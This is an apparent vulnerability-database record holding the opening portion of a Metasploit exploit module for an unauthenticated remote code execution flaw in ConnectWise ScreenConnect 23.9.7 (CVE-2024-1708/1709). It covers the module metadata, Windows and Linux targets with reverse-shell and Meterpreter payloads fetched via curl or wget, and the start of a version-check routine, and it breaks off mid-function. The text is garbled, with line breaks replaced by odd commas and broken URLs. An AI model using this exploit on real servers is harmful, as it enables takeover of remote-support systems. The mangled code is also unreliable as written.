{
    "text": "vul_url : https : /cxsecurity.com/issue/WLB-2024020085 ， vul_name : ConnectWise ScreenConnect 23.9.7 Unauthenticated Remote Code Execution ， vul_date : 2024.02.25 ， vul_credit_name : sfewer-r7 ， vul_risk : Medium ， vul_local : No ， vul_remote : Yes ， vul_cve : CVE-2024-1708 ， vul_cwe : N/A ， vul_poc :  #  ，  # This module requires Metasploit : https : /metasploit.com/download ，  # Current source : https : /github.com/rapid7/metasploit-framework ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : FileDropper ， super (  ， update_info (  ， info ,  ， 'Name' => 'ConnectWise ScreenConnect Unauthenticated Remote Code Execution' ,  ， 'Description' => %q{ ， This module exploits an authentication bypass vulnerability that allows an unauthenticated attacker to create ， a new administrator user account on a vulnerable ConnectWise ScreenConnect server. The attacker can leverage ， this to achieve RCE by uploading a malicious extension module. All versions of ScreenConnect version 23.9.7 ， and below are affected. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'sfewer-r7' ,  # MSF RCE Exploit ， 'WatchTowr' ,  # Auth Bypass PoC ，  ]  ,  ， 'References' => [  ，  [ 'CVE' , '2024-1708' ]  ,  # Path traversal when extracting zip file. ，  [ 'CVE' , '2024-1709' ]  ,  # Auth bypass to create admin account. ，  [ 'URL' , 'https : /www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8' ]  ,  # Vendor Advisory ，  [ 'URL' , 'https : /github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc/' ]  ,  # Auth Bypass PoC ，  [ 'URL' , 'https : /www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass' ]  # Analysis of both CVEs ，  ]  ,  ， 'DisclosureDate' => '2024-02-19' ,  ， 'Platform' => %w [ win linux unix ]  ,  ， 'Arch' => [ ARCH_X64 , ARCH_CMD ]  ,  ， 'Privileged' => true ,  # 'NT AUTHORITY\\SYSTEM' on Windows , root on Linux. ， 'Targets' => [  ，  [  ，  # Tested ScreenConnect 23.9.7.8804 on Server 2022 with payloads :  ，  # windows/x64/meterpreter/reverse_tcp ， 'Windows In-Memory' , { ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_X64 ， } ，  ]  ,  ，  [  ，  # Tested ScreenConnect 23.9.7.8804 on Server 2022 with payloads :  ，  # cmd/windows/http/x64/meterpreter/reverse_tcp ， 'Windows Command' , { ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultOptions' => { ， 'FETCH_COMMAND' => 'CURL' ,  ， 'FETCH_WRITABLE_DIR' => '%TEMP%' ， } ， } ，  ]  ,  ，  [  ，  # Tested ScreenConnect 20.3.31734 on Ubuntu 18.04.6 with payloads :  ，  # cmd/linux/http/x64/meterpreter/reverse_tcp ，  # cmd/unix/reverse_bash ， 'Linux Command' , { ， 'Platform' => %w [ linux unix ]  ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultOptions' => { ， 'FETCH_COMMAND' => 'WGET' ,  ， 'FETCH_WRITABLE_DIR' => '/tmp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultOptions' => { ， 'RPORT' => 8040 ,  ， 'SSL' => false ,  ， 'EXITFUNC' => 'thread' ， } ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [  ， IOC_IN_LOGS ,  ， CONFIG_CHANGES ,  ，  # The existing administrator account will be replaced ， ACCOUNT_LOCKOUTS ，  ]  ， } ， register_options (  [  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to create ( default : random ) ' , Rex : Text.rand_text_alpha_lower ( 8 )  ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password for the new user ( default : random ) ' , Rex : Text.rand_text_alphanumeric ( 16 )  ]  )  ，  ]  )  ， end ， def check ，  # This is a file found on the recent 23.9.7.8804 ( Circa 2024 )  , an out of support 20.3.31734 ( Circa 2021 )  , and ，  # a very old 2.5.3409.4645 ( Circa 2012 ) . So we can expect this file to exist on all targets. As this endpoint ，  # expects authentication , the response will be a 302 redirect to the Login page. As Windows is case insensitive ，  # we can request 'Host.aspx' with any case and get the expected 302 response , however Linux is case sensitive and ，  # will always 404 a request to 'Host.aspx' if we jumble up the case. Both a 302 and 404 response will still include ，  # the Server header , which we use to confirm both ScreenConnect and the version number. ， host_aspx = 'Host.aspx' ， host_aspx = loop do ， jumblecase_host_aspx = host_aspx.chars.map { | c | rand ( 2 ) = 0 ? c.upcase : c.downcase }.join ， end ， res = send_request_cgi (  ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path , host_aspx ) ",
    "time": null
}